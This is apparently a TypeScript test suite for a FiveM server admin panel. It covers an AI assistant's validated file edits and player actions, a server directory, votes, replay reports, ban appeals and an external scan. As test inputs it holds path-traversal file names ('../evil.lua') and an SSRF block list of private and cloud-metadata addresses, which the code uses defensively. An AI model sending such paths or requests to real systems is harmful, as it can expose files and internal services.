      { kind: "console", command: "quit", label: "Quitter" },
      { kind: "console", command: "ensure mon_job" }
    ]
  }), known)!;
  assert.equal(reply.answer, "Ta table est nil.");
  assert.deepEqual(reply.actions, [
    { kind: "resource", action: "restart", name: "mon_job", label: "Redémarrer mon_job" },
    { kind: "console", command: "ensure mon_job", label: "ensure mon_job" }
  ]);
  assert.equal(t.parseTroubleshoot("pas de json", known), null);
  delete process.env.AI_API_KEY;
  await assert.rejects(t.troubleshoot("default", { messages: [{ role: "user", content: "aide" }] }), /ai_not_configured/);
});

test("assistant files: read through the agent, change to validate, write with hash check, undo", async () => {
  const rf = await import("../src/lib/resource-files");
  const shared = await import("../src/lib/resource-files-shared");
  const crypto = await import("node:crypto");
  const sha = (s: string) => crypto.createHash("sha256").update(s, "utf8").digest("hex");
  const S = "files-a";
  const actor = { discordId: A, username: "Boss" };
  const state = { hostname: "x", maxClients: 10, uptime: 60, players: [], resources: [{ name: "mon_job", state: "started" }, { name: "fiverax_agent", state: "started" }] };
  await agentCall(S, { state });

  await assert.rejects(rf.requestRead(S, actor, "fiverax_agent"), /invalid_resource/);
  await assert.rejects(rf.requestRead(S, actor, "absente"), /unknown_resource/);
  const listId = await rf.requestRead(S, actor, "mon_job");
  const readId = await rf.requestRead(S, actor, "mon_job", ["server.lua", "../evil.lua", "image.png"]);
  const sent = await agentCall(S, {});
  const cmds = sent.commands.filter((c) => c.kind === "files");
  assert.deepEqual(cmds.map((c) => c.payload), [{ op: "list", resource: "mon_job" }, { op: "read", resource: "mon_job", paths: ["server.lua"] }]);

  const original = "local x = nil\nprint(x.name)\n";
  await rf.receiveFromAgent(S, { commandId: listId, op: "list", resource: "mon_job", ok: true, list: [{ path: "server.lua", size: 30 }, { path: "client.lua", size: 10 }] });
  await rf.receiveFromAgent(S, { commandId: readId, op: "read", resource: "mon_job", ok: true, files: [{ path: "server.lua", content: original }] });
  assert.equal((await rf.readStatus(S, readId))?.status, "done");
  assert.deepEqual((await rf.listings(S, ["mon_job"]))[0].files.map((f) => f.path), ["server.lua", "client.lua"]);
  assert.equal((await rf.cachedFiles(S, [{ resource: "mon_job", path: "server.lua" }]))[0].content, original);

  // Edits: patch of a read file, new file, unread existing file refused, missing text refused.
  const { change, rejected } = await rf.proposeChange(S, actor, "Corrige le nil", [
    { resource: "mon_job", path: "server.lua", patches: [{ find: "local x = nil", replace: "local x = { name = 'ok' }" }] },
    { resource: "mon_job", path: "config.lua", content: "Config = {}\n" },
    { resource: "mon_job", path: "client.lua", content: "-- réécrit" },
    { resource: "mon_job", path: "server.lua", patches: [{ find: "introuvable", replace: "x" }] }
  ]);
  assert.equal(rejected.length, 2);
  assert.match(rejected[0], /pas encore lu/);
  assert.match(rejected[1], /introuvable/);
  assert.equal(change!.status, "proposed");
  assert.deepEqual(change!.files.map((f) => [f.path, f.before === null]), [["server.lua", false], ["config.lua", true]]);
  assert.equal((await rf.listChanges(S)).length, 0); // proposals are not in the history

  const applied = await rf.applyChange(S, actor, change!.id, true);
  assert.equal(applied.status, "pending");
  const write = (await agentCall(S, {})).commands.find((c) => c.kind === "files")!;
  const files = write.payload.files as { path: string; content: string | null; expect: string }[];
  assert.equal(write.payload.restart, true);
  assert.equal(files[0].expect, sha(original));
  assert.equal(files[1].expect, ""); // new file
  await rf.receiveFromAgent(S, { commandId: write.id, op: "write", resource: "mon_job", ok: true, message: "2 fichier(s) modifié(s)" });
  const done = await rf.getChange(S, change!.id);
  assert.equal(done?.status, "applied");
  assert.equal((await rf.cachedFiles(S, [{ resource: "mon_job", path: "server.lua" }]))[0].content, "local x = { name = 'ok' }\nprint(x.name)\n");
  await assert.rejects(rf.applyChange(S, actor, change!.id, true), /change_not_pending/);

  // Undo: a conflict keeps it applied, then a successful undo restores the cache.
  await rf.revertChange(S, actor, change!.id);
  const undo = (await agentCall(S, {})).commands.find((c) => c.kind === "files")!;
  assert.equal((undo.payload.files as { content: string | null }[])[1].content, null); // the new file is deleted
  await rf.receiveFromAgent(S, { commandId: undo.id, op: "write", resource: "mon_job", ok: false, message: "server.lua a changé", conflict: "server.lua" });
  assert.equal((await rf.getChange(S, change!.id))?.status, "applied");
  await rf.revertChange(S, actor, change!.id);
  const undo2 = (await agentCall(S, {})).commands.find((c) => c.kind === "files")!;
  await rf.receiveFromAgent(S, { commandId: undo2.id, op: "write", resource: "mon_job", ok: true });
  assert.equal((await rf.getChange(S, change!.id))?.status, "reverted");
  assert.equal((await rf.cachedFiles(S, [{ resource: "mon_job", path: "server.lua" }]))[0].content, original);
  assert.equal((await rf.cachedFiles(S, [{ resource: "mon_job", path: "config.lua" }])).length, 0);
  assert.equal((await rf.listChanges(S)).length, 1);

  // Pure helpers.
  assert.deepEqual(shared.applyPatches("a\r\nb\r\n", [{ find: "a\nb", replace: "c\nd" }]), { ok: true, text: "c\r\nd\r\n" });
  assert.deepEqual(shared.applyPatches("x x", [{ find: "x", replace: "y" }]), { ok: false, find: "x", reason: "ambiguous" });
  const diff = shared.lineDiff("a\nb\nc", "a\nB\nc");
  assert.equal(diff.filter((l) => l.type === "add").length, 1);
  assert.equal(diff.filter((l) => l.type === "del").length, 1);
  assert.equal(shared.isEditablePath("html/index.html"), true);
  assert.equal(shared.isEditablePath("../server.cfg"), false);
  assert.equal(shared.isEditablePath("stream/car.ytd"), false);
  assert.equal(m.agent.COMMANDS.files.permission, "server_files");
});

test("assistant player actions: validated against connected players and the command schemas", async () => {
  const t = await import("../src/lib/troubleshoot");
  const players = new Map([[12, "Tata"], [7, "Bob"]]);
  const resources = new Set(["mon_job"]);
  const reply = t.parseTroubleshoot(JSON.stringify({
    answer: "Je rembourse Tata.",
    actions: [
      { kind: "player", command: "game", payload: { op: "give_money", target: 12, account: "bank", amount: 5000 } },
      { kind: "player", command: "game", payload: { op: "give_money", target: 99, account: "cash", amount: 10 } }, // offline
      { kind: "player", command: "game", payload: { op: "give_money", target: 12, account: "cash", amount: -5 } }, // invalid
      { kind: "player", command: "game", payload: { op: "set_job", target: 7, job: "mechanic", grade: 2 } },
      { kind: "player", command: "game", payload: { op: "teleport", target: 12, to: 7 } },
      { kind: "player", command: "game", payload: { op: "teleport", target: 12 } }, // no destination
      { kind: "player", command: "kick", payload: { target: 7, reason: "AFK" } },
      { kind: "player", command: "screenshot", payload: { target: 7 } }, // not an assistant command
      { kind: "announce", message: "Reboot dans 5 min" }
    ]
  }), resources, players)!;
  assert.deepEqual(reply.actions.map((a) => (a.kind === "player" ? a.description : a.kind)), [
    `Donner ${(5000).toLocaleString("fr-FR")} $ (banque) à Tata (id 12)`,
    "Mettre Bob (id 7) job mechanic, grade 2",
    "Téléporter Tata (id 12) vers Bob (id 7)",
    "Expulser Bob (id 7) : « AFK »",
    "announce"
  ]);

  // Only what the admin may run.
  const limited = t.parseTroubleshoot(JSON.stringify({
    answer: "x",
    actions: [{ kind: "player", command: "game", payload: { op: "heal", target: 7 } }, { kind: "console", command: "status" }]
  }), resources, players, new Set(["console"]))!;
  assert.deepEqual(limited.actions.map((a) => a.kind), ["console"]);
  assert.equal(m.agent.COMMANDS.game.permission, "player_manage");
});

test("directory: listing, publishing, verified reviews, reports, featured slots, stats, order", async () => {
  const dir = await import("../src/lib/directory");
  const shared = await import("../src/lib/directory-shared");
  const owner = "930000000000000001";
  const created = await m.servers.createServer({ name: "Los Santos Life", guildId: null, createdBy: owner });
  assert.ok(created.ok);
  const S = created.ok ? created.server.id : "";
  const other = await m.servers.createServer({ name: "Autre RP", guildId: null, createdBy: owner });
  const S2 = other.ok ? other.server.id : "";
  const actor = { discordId: owner, username: "Owner" };

  const draft = await dir.getListing(S);
  assert.equal(draft.slug, "los-santos-life");
  assert.equal(draft.updatedAt, null);
  await assert.rejects(dir.setPublished(S, actor, true), /listing_not_saved/);
  const input = {
    ...draft, tagline: "RP sérieux, économie réaliste", description: "x".repeat(100), connect: "cfx.re/join/abc123", discord: "discord.gg/lsl",
    tags: ["serious", "whitelist"], framework: "esx", minAge: 16
  };
  await assert.rejects(dir.saveListing(S, actor, { ...input, connect: "pas une adresse" }), /invalid_connect/);
  await assert.rejects(dir.saveListing(S, actor, { ...input, bannerUrl: "http://insecure.example/x.png" }), /invalid_bannerUrl/);
  const saved = await dir.saveListing(S, actor, input);
  assert.equal(saved.published, false);
  await assert.rejects(dir.saveListing(S2, actor, { ...(await dir.getListing(S2)), slug: "los-santos-life" }), /slug_taken/);
  assert.equal(await dir.getPublicListing("los-santos-life"), null); // not published yet
  assert.equal((await dir.setPublished(S, actor, true)).published, true);
  assert.equal(shared.joinUrl("cfx.re/join/ABC123"), "https://cfx.re/join/abc123");
  assert.equal(shared.joinUrl("51.12.3.4:30120"), "fivem://connect/51.12.3.4:30120");
  assert.equal(shared.discordUrl("https://discord.com/invite/lsl"), "https://discord.gg/lsl");

  // Reviews: login, then play time recorded by the agent, never staff.
  const player = { discordId: "940000000000000001", username: "Tata", avatarUrl: null };
  assert.deepEqual(await dir.reviewEligibility(S, null), { ok: false, reason: "login", playtime: 0, needed: shared.MIN_REVIEW_SECONDS });
  assert.equal((await dir.reviewEligibility(S, player)).ok, false);
  await assert.rejects(dir.upsertReview("los-santos-life", player, { rating: 5, body: "Super serveur, staff au top et économie bien pensée." }), /review_not_played/);
  const now = new Date();
  await m.db.db.run("INSERT INTO players (server_id, license, name, discord_id, first_seen_at, last_seen_at) VALUES (?, 'license:t', 'Tata', ?, ?, ?)", [S, player.discordId, now.toISOString(), now.toISOString()]);
  const pid = (await m.db.db.get<{ id: number }>("SELECT id FROM players WHERE server_id = ? AND license = 'license:t'", [S]))!.id;
  await m.db.db.run("INSERT INTO player_sessions (server_id, player_id, external_id, started_at, ended_at, seconds) VALUES (?, ?, 'dir-s1', ?, ?, 4000)", [S, pid, now.toISOString(), now.toISOString()]);
  assert.equal((await dir.reviewEligibility(S, player)).ok, true);
  assert.equal((await dir.reviewEligibility(S, { discordId: owner, username: "Owner", avatarUrl: null })).ok, false); // owner = staff
  await assert.rejects(dir.upsertReview("los-santos-life", player, { rating: 5, body: "trop court" }), /invalid_review/);
  const review = await dir.upsertReview("los-santos-life", player, { rating: 4, body: "Super serveur, staff au top et économie bien pensée." });
  assert.equal(review.playtimeHours, 1);
  await dir.upsertReview("los-santos-life", player, { rating: 5, body: "Après une semaine : encore mieux, je recommande à tous." });
  const pub = (await dir.getPublicListing("los-santos-life"))!;
  assert.deepEqual([pub.rating.count, pub.rating.average], [1, 5]); // one review per account, rewritten
  assert.equal(pub.live?.weekPlayers, 1);

  await dir.replyReview(S, actor, review.id, "Merci Tata !");
  assert.equal((await dir.listReviews(S, null))[0].reply, "Merci Tata !");

  // Three different accounts hide it; moderation puts it back.
  await assert.rejects(dir.reportReview(review.id, player, "mon avis"), /own_review/);
  for (let i = 0; i < 3; i++) await dir.reportReview(review.id, { discordId: `95000000000000000${i}`, username: `r${i}`, avatarUrl: null }, "faux avis");
  assert.equal((await dir.reportReview(review.id, { discordId: "950000000000000000", username: "r0", avatarUrl: null }, "encore").catch((e) => e.message)), "unknown_review");
  assert.equal((await dir.getPublicListing("los-santos-life"))!.rating.count, 0);
  assert.equal((await dir.listReviews(S, player.discordId))[0].status, "hidden"); // the author still sees it
  assert.equal((await dir.reviewsToModerate()).some((r) => r.id === review.id), true);
  await dir.moderateReview(review.id, "published");
  assert.equal((await dir.getPublicListing("los-santos-life"))!.rating.count, 1);

  // Featured: only a published listing, slots follow each other.
  await assert.rejects(dir.addFeatured(S2, actor, 7, null), /listing_not_published/);
  const slots = await dir.addFeatured(S, actor, 7, null);
  const more = await dir.addFeatured(S, actor, 3, null);
  assert.equal(slots.length, 1);
  assert.equal(more[1].startsAt, more[0].endsAt);
  const { cards, featured, total } = await dir.listDirectory();
  assert.equal(total, 1);
  assert.equal(cards[0].featured, true);
  assert.equal(featured.length, 1);
  assert.equal((await dir.listDirectory({ tag: "open" })).cards.length, 0);
  assert.equal((await dir.listDirectory({ q: "santos" })).cards.length, 1);

  // Stats.
  await dir.track("los-santos-life", "view");
  await dir.track("los-santos-life", "view");
  await dir.track("los-santos-life", "join");
  await dir.track("inconnu", "view");
  const stats = await dir.statsFor(S, 7);
  assert.deepEqual([stats.totals.view, stats.totals.join, stats.days.length], [2, 1, 7]);

  // Order: featured first, then live players / rating.
  const card = (id: string, extra: Partial<import("../src/lib/directory-shared").DirectoryCard>) => ({
    serverId: id, slug: id, name: id, tagline: "", logoUrl: null, bannerUrl: null, tags: [], framework: "esx", language: "fr", minAge: 0, featured: false,
    live: { online: false, players: 0, maxClients: 64, weekPlayers: 0 }, rating: { average: null, count: 0, distribution: [0, 0, 0, 0, 0] as [number, number, number, number, number] }, publishedAt: null, votes: 0, ...extra
  });
  const sorted = shared.sortCards([
    card("calme", {}),
    card("plein", { live: { online: true, players: 80, maxClients: 128, weekPlayers: 300 } }),
    card("une", { featured: true })
  ], "relevance");
  assert.deepEqual(sorted.map((c) => c.serverId), ["une", "plein", "calme"]);

  await dir.setPublished(S, actor, false);
  assert.equal((await dir.listDirectory()).total, 0);
});

// ---- black box, votes, player portal ----

test("black box: weapon hashes, frames blended between samples, trails", async () => {
  const bb = await import("../src/lib/blackbox-shared");
  assert.equal(bb.joaat("WEAPON_PISTOL"), 453432689);
  assert.equal(bb.weaponLabel(453432689), "Pistolet");
  assert.equal(bb.weaponLabel(-1569615261), "Poings"); // signed hash, as Lua may send it
  assert.equal(bb.weaponLabel(0), null);
  const frames = [
    { t: 100, p: [[1, 0, 0, 0, 350, 200, 0, 0, 0, 0, ""], [2, 50, 50, 0, 0, 200, 0, 1, 0, 0, ""]] },
    { t: 102, p: [[1, 10, 20, 0, 10, 180, 0, 4, 0, 0, "Sultan"]] },
    { t: 120, p: [[1, 500, 500, 0, 0, 100, 0, 2, 0, 0, ""]] }
  ] as import("../src/lib/blackbox-shared").Frame[];
  assert.equal(bb.frameIndexAt(frames, 99), -1);
  assert.equal(bb.frameIndexAt(frames, 101), 0);
  const mid = bb.playersAt(frames, 101);
  assert.deepEqual([mid[0].x, mid[0].y, Math.round(mid[0].heading)], [5, 10, 360]); // shortest turn from 350 to 10
  assert.equal(mid[1].talking, true);
  const gap = bb.playersAt(frames, 110);
  assert.deepEqual([gap[0].x, gap[0].inVehicle, gap[0].vehicle], [10, true, "Sultan"]); // 18 s gap: not blended
  assert.equal(bb.playersAt(frames, 120)[0].dead, true);
  assert.deepEqual(bb.trailOf(frames, 1, 100, 102), [[0, 0], [10, 20]]);
});

const BB = "bb-srv";

test("black box: a /report upload becomes a report with its replay, idempotent, handled by the staff, seen by the reporter", async () => {
  const bb = await import("../src/lib/blackbox");
  const t = Math.floor(Date.now() / 1000) - 120;
  const reporterDiscord = "950000000000000001";
  await agentCall(BB, {
    events: [
      { type: "join", session: "r1", name: "Reporter", identifiers: ["license:rep", `discord:${reporterDiscord}`], timestamp: t - 600 },
      { type: "join", session: "r2", name: "Cible", identifiers: ["license:cib"], timestamp: t - 600 }
    ]
  });
  const raw = {
    ref: "abc123-1", kind: "report", reason: "Il m'a tiré dessus sans raison", at: t,
    reporter: { id: 1, name: "Reporter", session: "r1" }, target: { id: 2, name: "Cible", session: "r2" },
    players: [{ id: 1, name: "Reporter", session: "r1" }, { id: 2, name: "Cible", session: "r2" }],
    frames: [{ t: t - 4, p: [[1, 10.4, 20, 30, 90, 200, 50, 0, 0, 0, ""], [2, 15, 20, 30, 270, 200, 0, 1, 2.5, 0, ""]] }, { t: t - 2, p: {} }, { t: t - 6, p: [[1, 0, 0, 0]] }],
    events: [{ t: t - 3, k: "hit", a: 2, b: 1, w: 453432689, d: 25 }, { t: t - 2, k: "death", a: 2, b: 1, w: 453432689 }, { t: t - 1, k: "nope" }]
  };
  assert.equal(bb.parseUpload({ ...raw, ref: "x" }), null); // bad ref
  const up = bb.parseUpload(raw)!;
  assert.deepEqual(up.frames.map((f) => f.t), [t - 6, t - 4, t - 2]); // sorted
  assert.deepEqual(up.frames[0].p, []); // entries too short are dropped
  assert.deepEqual(up.frames[1].p[1], [2, 15, 20, 30, 270, 200, 0, 1, 2.5, 0, ""]);
  assert.equal(up.events.length, 2);

  const first = await bb.ingestCapture(BB, up);
  assert.equal(first.created, true);
  assert.deepEqual(await bb.ingestCapture(BB, up), { id: first.id, created: false }); // the agent retried
  const report = (await bb.getReport(BB, first.id))!;
  assert.deepEqual([report.kind, report.status, report.reporterName, report.targetName, report.hasCapture, report.capturePlayers], ["report", "open", "Reporter", "Cible", true, 2]);
  assert.ok(report.reporterPlayerId && report.targetPlayerId);
  const capture = (await bb.getCapture(BB, first.id))!;
  assert.deepEqual([capture.reporter, capture.target, capture.frames.length, capture.events[1].k], [1, 2, 3, "death"]);
  assert.equal(capture.players.find((p) => p.id === 2)?.playerId, report.targetPlayerId);
  assert.equal(await bb.getCapture("other", first.id), null); // another server cannot read it

  const staff = { discordId: A, username: "Modo" };
  assert.equal((await bb.updateReport(BB, staff, first.id, { action: "claim" })).claimedName, "Modo");
  assert.deepEqual(await bb.countOpenReports(BB), { open: 0, claimed: 1 });
  const closed = await bb.updateReport(BB, staff, first.id, { action: "close", outcome: "sanctioned", verdict: "Joueur banni 3 jours, merci !" });
  assert.deepEqual([closed.status, closed.outcome], ["closed", "sanctioned"]);
  const mine = await bb.reportsMadeBy(reporterDiscord);
  assert.deepEqual(mine.map((r) => [r.id, r.status, r.verdict]), [[first.id, "closed", "Joueur banni 3 jours, merci !"]]);
  assert.equal((await bb.listReports(BB, { status: "active" })).length, 0);
  assert.equal((await bb.listReports(BB, { playerId: report.targetPlayerId! })).length, 1);

  // Replays are dropped after 30 days, the reports stay.
  assert.equal(await bb.pruneCaptures(new Date(Date.now() + 31 * 86_400_000)), 1);
  assert.equal((await bb.getReport(BB, first.id))?.hasCapture, false);
});

test("black box: the panel asks the agent for a capture (command schema), manual uploads keep who asked", async () => {
  const bb = await import("../src/lib/blackbox");
  assert.equal(m.agent.COMMANDS.blackbox.schema.safeParse({ seconds: 10 }).success, false);
  assert.equal(m.agent.COMMANDS.blackbox.schema.safeParse({ seconds: 120, center: 4, reason: "fusillade" }).success, true);
  await agentCall(BB, { state: { hostname: "x", maxClients: 8, uptime: 1, players: [], resources: [] } });
  const cmd = await m.agent.enqueueCommand(BB, { discordId: B, username: "b" }, "blackbox", { seconds: 120 });
  const handed = await agentCall(BB, {});
  assert.deepEqual(handed.commands.map((c) => c.kind), ["blackbox"]);
  const now = Math.floor(Date.now() / 1000);
  const up = bb.parseUpload({ ref: "manual-1", kind: "manual", command: cmd, at: now, players: [], frames: [{ t: now, p: [] }], events: [] })!;
  const { id } = await bb.ingestCapture(BB, up);
  const row = await db.get<{ requested_by: string; reason: string }>("SELECT requested_by, reason FROM player_reports WHERE id = ?", [id]);
  assert.deepEqual([row?.requested_by, row?.reason], [B, "Capture demandée depuis le panel"]);
});

const oldDiscord = (n: number) => `10000000000000${String(n).padStart(4, "0")}`; // a 2015 account
const youngDiscord = () => (BigInt(Date.now() - 1420070400000 - 86_400_000) * BigInt(4194304)).toString();

test("votes: cooldown per account and per address, young accounts refused, monthly count and ranking", async () => {
  const votes = await import("../src/lib/votes");
  const shared = await import("../src/lib/votes-shared");
  await db.run("INSERT INTO directory_listings (server_id, slug, data_json, published, updated_at) VALUES (?, 'vote-city', '{}', 1, ?)", [BB, new Date().toISOString()]);
  assert.ok(shared.discordAccountCreatedAt(oldDiscord(1))!.getUTCFullYear() < 2017);
  const now = new Date();
  const v1 = { discordId: oldDiscord(1), username: "Voter1" };
  const v2 = { discordId: oldDiscord(2), username: "Voter2" };

  assert.equal((await votes.voteState(BB, null, true, now)).reason, "login");
  await assert.rejects(votes.castVote("vote-city", { discordId: youngDiscord(), username: "Neuf" }, null, now), /vote_young_account/);
  await assert.rejects(votes.castVote("inconnu", v1, null, now), /unknown_listing/);
  const res = await votes.castVote("vote-city", v1, votes.ipHash("1.2.3.4"), now);
  assert.deepEqual([res.reward, res.month], ["none", 1]); // no reward configured
  await assert.rejects(votes.castVote("vote-city", v1, votes.ipHash("5.6.7.8"), new Date(now.getTime() + 3600_000)), /vote_cooldown/);
  await assert.rejects(votes.castVote("vote-city", v2, votes.ipHash("1.2.3.4, 10.0.0.1"), new Date(now.getTime() + 60_000)), /vote_same_address/);
  await votes.castVote("vote-city", v1, votes.ipHash("1.2.3.4"), new Date(now.getTime() + 2 * 3600_000 + 1000)); // cooldown over
  const state = await votes.voteState(BB, v1, true, new Date(now.getTime() + 2 * 3600_000 + 2000));
  assert.deepEqual([state.month, state.rank, state.canVote, state.reason], [2, 1, false, "cooldown"]);
  assert.equal(votes.ipHash(null), null);
  assert.notEqual(votes.ipHash("1.2.3.4"), "1.2.3.4");
});

test("votes: rewards wait for the player in game, go through the agent once, and are never given twice", async () => {
  const votes = await import("../src/lib/votes");
  const V = "vote-srv";
  const voter = { discordId: oldDiscord(7), username: "Gamer" };
  await db.run("INSERT INTO directory_listings (server_id, slug, data_json, published, updated_at) VALUES (?, 'reward-city', '{}', 1, ?)", [V, new Date().toISOString()]);
  const owner = { discordId: A, username: "Owner" };
  await assert.rejects(votes.saveVoteSettings(V, owner, { rewardsEnabled: true, rewards: [] }), /no_rewards/);
  await assert.rejects(votes.saveVoteSettings(V, owner, { rewardsEnabled: true, rewards: [{ type: "money", account: "cash", amount: 0 }] }), /invalid_vote_settings/);
  await votes.saveVoteSettings(V, owner, { rewardsEnabled: true, rewards: [{ type: "money", account: "bank", amount: 5000 }, { type: "item", item: "bread", label: "Pain", count: 3 }], message: "Merci !" });
  assert.deepEqual((await votes.voteState(V, null, true)).rewards, ["5 000 $ (banque)", "3 × Pain"]);

  // Never played there: the vote counts, no reward.
  assert.equal((await votes.castVote("reward-city", voter, null)).reward, "no_player");

  // Plays there now (Discord linked), connected for 5 min.
  const t = Math.floor(Date.now() / 1000);
  const voter2 = { discordId: oldDiscord(8), username: "Gamer2" };
  const snapshot = (uptime: number) => ({ hostname: "x", maxClients: 8, uptime, players: [{ id: 5, name: "Gamer2", session: "g2", ping: 10 }], resources: [] });
  await agentCall(V, {
    events: [{ type: "join", session: "g2", name: "Gamer2", identifiers: ["license:g2", `discord:${voter2.discordId}`], timestamp: t - 300 }],
    state: snapshot(1)
  });
  const cast = await votes.castVote("reward-city", voter2, null);
  assert.equal(cast.reward, "sent");
  const handed = await agentCall(V, {});
  assert.equal(handed.commands.length, 1);
  const cmd = handed.commands[0];
  assert.deepEqual([cmd.kind, cmd.payload.op, cmd.payload.target, (cmd.payload.rewards as unknown[]).length], ["game", "reward", 5, 2]);
  assert.equal(m.agent.COMMANDS.game.schema.safeParse(cmd.payload).success, true);

  // The character was not loaded: back to waiting, then given on the next snapshot.
  await agentCall(V, { results: [{ id: cmd.id, ok: false, message: "Le personnage du joueur n'est pas encore chargé" }] });
  assert.equal((await db.get<{ reward_status: string }>("SELECT reward_status FROM directory_votes WHERE server_id = ? AND discord_id = ?", [V, voter2.discordId]))?.reward_status, "pending");
  await agentCall(V, { state: snapshot(2) });
  const retry = (await agentCall(V, {})).commands;
  assert.equal(retry.length, 1);
  await agentCall(V, { results: [{ id: retry[0].id, ok: true, message: "Récompense donnée" }] });
  const done = await votes.votesBy(voter2.discordId);
  assert.deepEqual([done[0].reward, done[0].rewards], ["delivered", ["5 000 $ (banque)", "3 × Pain"]]);
  await agentCall(V, { state: snapshot(3) });
  assert.deepEqual((await agentCall(V, {})).commands, []); // never given twice

  const staff = await votes.votesForStaff(V);
  assert.deepEqual([staff.month, staff.top.length], [2, 2]);
});

test("player portal: play time and sanctions across servers, ban appeal once at a time, accepted appeal lifts the ban", async () => {
  const portal = await import("../src/lib/portal");
  const P = "portal-srv";
  const me = { discordId: oldDiscord(42), username: "Joueur" };
  const t = Math.floor(Date.now() / 1000) - 7200;
  await agentCall(P, { events: [{ type: "join", session: "j1", name: "John Doe", identifiers: ["license:jd", `discord:${me.discordId}`], timestamp: t }] });
  await agentCall(P, { events: [{ type: "leave", session: "j1", timestamp: t + 1800 }] });
  const pid = (await m.players.listPlayers(P, { q: "John" })).rows[0].id;
  await m.security.banPlayer(P, { discordId: A, username: "Modo" }, { playerId: pid, reason: "Freekill", source: "manual", expiresAt: null });
  const banId = (await m.security.listBans(P, { playerId: pid }))[0].id;

  // P is not a registered server (no row in `servers`): the portal only lists real servers.
  assert.equal((await portal.portalFor(me)).servers.length, 0);
  const created = await m.servers.createServer({ name: "Portal City", guildId: "540000000000000042", createdBy: A });
  assert.ok(created.ok);
  const S2 = created.server.id;
  await agentCall(S2, { events: [{ type: "join", session: "j2", name: "John Doe", identifiers: ["license:jd2", `discord:${me.discordId}`], timestamp: t }] });
  await agentCall(S2, { events: [{ type: "leave", session: "j2", timestamp: t + 3600 }] });
  const pid2 = (await m.players.listPlayers(S2, { q: "John" })).rows[0].id;
  await m.security.banPlayer(S2, { discordId: A, username: "Modo" }, { playerId: pid2, reason: "Freekill", source: "manual", expiresAt: null });
  const ban2 = (await m.security.listBans(S2, { playerId: pid2 }))[0].id;

  const view = await portal.portalFor(me);
  assert.deepEqual(view.servers.map((s) => [s.name, s.playSeconds, s.sessions, s.bans.length, s.bans[0].canAppeal]), [["Portal City", 3600, 1, 1, true]]);
  assert.equal(view.totals.playSeconds, 3600);

  await assert.rejects(portal.submitAppeal(me, S2, ban2, "trop court"), /invalid_appeal/);
  await assert.rejects(portal.submitAppeal({ discordId: oldDiscord(43), username: "Autre" }, S2, ban2, "x".repeat(40)), /unknown_ban/); // not their ban
  await assert.rejects(portal.submitAppeal(me, S2, banId, "x".repeat(40)), /unknown_ban/); // ban of another server
  const appeal = await portal.submitAppeal(me, S2, ban2, "Je n'ai pas tiré le premier, regardez le replay du report s'il vous plaît.");
  await assert.rejects(portal.submitAppeal(me, S2, ban2, "x".repeat(40)), /appeal_open/);
  assert.equal(await portal.countOpenAppeals(S2), 1);

  // Refused: the player waits 7 days before contesting again.
  await portal.decideAppeal(S2, { discordId: A, username: "Modo" }, appeal, false, "Le replay montre l'inverse.");
  await assert.rejects(portal.decideAppeal(S2, { discordId: A }, appeal, true, null), /appeal_decided/);
  const refused = (await portal.portalFor(me)).servers[0].bans[0];
  assert.deepEqual([refused.canAppeal, Boolean(refused.appealAfter), refused.appeals[0].response], [false, true, "Le replay montre l'inverse."]);
  await assert.rejects(portal.submitAppeal(me, S2, ban2, "x".repeat(40)), /appeal_too_soon/);
  const later = new Date(Date.now() + 8 * 86_400_000);
  const second = await portal.submitAppeal(me, S2, ban2, "Nouvelle demande, une semaine plus tard, avec mes excuses.", later);
  await portal.decideAppeal(S2, { discordId: A, username: "Modo" }, second, true, "Ok, dernière chance.", later);
  assert.equal((await m.security.listBans(S2, { active: true, playerId: pid2 }, later)).length, 0); // ban lifted
  assert.equal((await portal.listAppeals(S2, "all")).length, 2);
  await m.servers.deleteServer(S2);
});

// ---- growth: free scan, "Protégé par Fiverax", referrals ----

test("free scan: targets, public addresses only (SSRF), analysis of what a server shows publicly", async () => {
  const x = await import("../src/lib/external-scan-shared");
  assert.deepEqual(x.parseTarget("https://cfx.re/join/AbC123"), { kind: "cfx", code: "abc123" });
  assert.deepEqual(x.parseTarget("abc123"), { kind: "cfx", code: "abc123" });
  assert.deepEqual(x.parseTarget("connect 51.75.12.34:30121"), { kind: "host", host: "51.75.12.34", port: 30121 });
  assert.deepEqual(x.parseTarget("play.monrp.fr"), { kind: "host", host: "play.monrp.fr", port: 30120 });
  assert.deepEqual(x.parseTarget("[2a01:4f8::1]:30120"), { kind: "host", host: "2a01:4f8::1", port: 30120 });
  for (const bad of ["", "localhost:30120", "1.2.3.4:22", "1.2.3.4:99999", "123456", "a..b:30120", "x".repeat(300)]) assert.equal(x.parseTarget(bad), null, bad);

  for (const ip of ["51.75.12.34", "8.8.8.8", "2a01:4f8::1"]) assert.equal(x.isPublicIp(ip), true, ip);
  for (const ip of ["127.0.0.1", "10.0.0.5", "172.16.3.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "224.0.0.1", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1", "2001:db8::1", "nope"]) {
    assert.equal(x.isPublicIp(ip), false, ip);
  }
  assert.equal(x.cleanServerName("^1Neon ^7City ~r~RP\u0001"), "Neon City RP");

  const risky = x.analyzeExternal({
    server: "FXServer-master SERVER v1.0.0.6683 win32",
    vars: { sv_scriptHookAllowed: "true", sv_projectName: "^2Neon City", onesync_enabled: "false" },
    resources: ["es_extended", "mysql-async", "esx_shops"],
    players: [{ endpoint: "51.75.12.34:5000", identifiers: ["license:x"] }, { endpoint: "127.0.0.1", identifiers: [] }]
  }, { build: 6683, recommended: 12000, critical: 7290 });
  const rules = risky.findings.map((f) => f.rule);
  for (const r of ["scripthook", "pure_level", "no_onesync", "game_build", "critical_artifacts", "public_endpoints", "no_anticheat", "old_mysql", "code_not_scanned"]) assert.ok(rules.includes(r), r);
  assert.equal(risky.facts.name, "Neon City");
  assert.equal(risky.facts.framework, "ESX");
  assert.ok(risky.score <= 35); // a critical problem caps the score
  assert.match(risky.findings.find((f) => f.rule === "public_endpoints")!.detail, /1 joueur sur 2/);
  assert.ok(!JSON.stringify(risky).includes("51.75.12.34")); // player data is counted, never kept

  const clean = x.analyzeExternal({
    server: "FXServer-master SERVER v1.0.0.12500 linux",
    vars: { sv_pureLevel: "1", onesync_enabled: "true", sv_enforceGameBuild: "3258" },
    resources: ["qbx_core", "oxmysql", "fiverax_agent"],
    players: [{ endpoint: "127.0.0.1" }]
  }, { build: 12500, recommended: 12000, critical: 7290 });
  assert.deepEqual(clean.findings.map((f) => f.rule), ["code_not_scanned"]);
  assert.equal(clean.score, 100);
